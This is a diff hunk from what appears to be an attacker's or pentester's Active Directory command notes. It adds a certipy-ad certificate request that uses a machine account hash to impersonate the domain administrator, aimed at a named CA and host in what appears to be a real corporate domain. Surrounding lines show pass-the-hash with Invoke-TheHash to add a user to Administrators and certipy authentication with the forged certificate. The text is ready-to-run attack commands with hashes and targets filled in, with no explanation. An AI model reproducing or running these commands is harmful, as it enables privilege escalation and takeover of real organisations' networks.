@@ -478,7 +478,9 @@
 				Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 				cd .\Invoke-TheHash\;Import-Module .\Invoke-TheHash.psm1
 				PS C:\Tools> Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators grace /add"
-				
+		
+		certipy-ad req -ca 'kuban-KSZI-ADM-CA-CA' -dc-ip 10.12.112.4 -u 'GDK16100304$' -hashes 'c0eead2be2afd9165637cdadb0e94e44' -template 'RDSCertificateTemplate' -target 'kszi-adm-ca.kuban.gazprom.ru' -upn 'administrator@kuban.gazprom.ru' -sid 'S-1-5-21-73586283-839522115-1060284298-500'
+			
 		certipy-ad auth -pfx administrator.pfx
   		
 		certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
